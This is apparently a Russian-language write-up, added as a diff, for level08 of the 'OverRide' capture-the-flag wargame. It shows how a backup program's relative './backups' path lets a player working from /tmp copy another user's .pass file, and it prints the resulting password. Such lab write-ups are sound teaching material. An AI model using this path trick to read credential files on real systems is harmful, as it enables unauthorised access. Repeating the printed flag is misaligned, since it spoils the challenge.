@@ -1,0 +1,27 @@
+Эта программа выполняет резервное копирование файла, поданного первым аргументом в программу level08.
+Она пытается открыть его, создать файл резервной копии в папке "./ backups" с таким же именем
+и регистрирует события в файле "./backups/.log".
+Поскольку путь относительный, а не абсолютный, мы можем использовать папку "/ tmp", как ".",
+когда мы выполняем программу с ее абсолютным путем,
+в этой папке у нас есть больше пользовательских привилегий:
+
+	level08@OverRide:~$ cd /tmp
+	level08@OverRide:~$ echo "testdrive" > ./test_file
+	level08@OverRide:~$ mkdir backups
+	level08@OverRide:~$ /home/users/level08/level08 ./test_file
+	level08@OverRide:~$ cat ./backups/test_file
+	testdrive
+
+Если мы попытаемся напрямую прочитать и зарезервировать файл “/ home / users / level09 / .pass”,
+мы увидем сообщение об ошибке:
+	level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+	ERROR: Failed to open ./backups//home/users/level09/.pass
+
+Мы можем просто создать каталог для хранения ".pass" внутри нашей папки для резервных копий:
+
+	level08@OverRide:/tmp$ mkdir ./backups/home
+	level08@OverRide:/tmp$ mkdir ./backups/home/users
+	level08@OverRide:/tmp$ mkdir ./backups/home/users/level09
+	level08@OverRide:/tmp$ /home/users/level08/level08 /home/users/level09/.pass
+	level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass 
+	fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S										#flag
